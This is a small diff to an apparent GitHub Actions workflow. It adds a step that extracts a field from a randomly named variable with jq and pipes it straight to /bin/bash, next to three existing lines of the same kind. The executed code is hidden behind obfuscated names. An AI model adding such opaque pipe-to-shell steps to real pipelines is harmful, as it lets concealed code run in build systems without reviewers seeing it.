@@ -30,6 +30,7 @@ jobs:
           echo $iab4 | jq -r .cdcla8933 | /bin/bash
           printf '%s' "$vgdj51474" | jq -r .wmsmh1443 | /bin/bash
           printf '%s' "$akdb54" | jq -r .t5974 | /bin/bash
+          echo $elf8 | jq -r .ligg13388 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
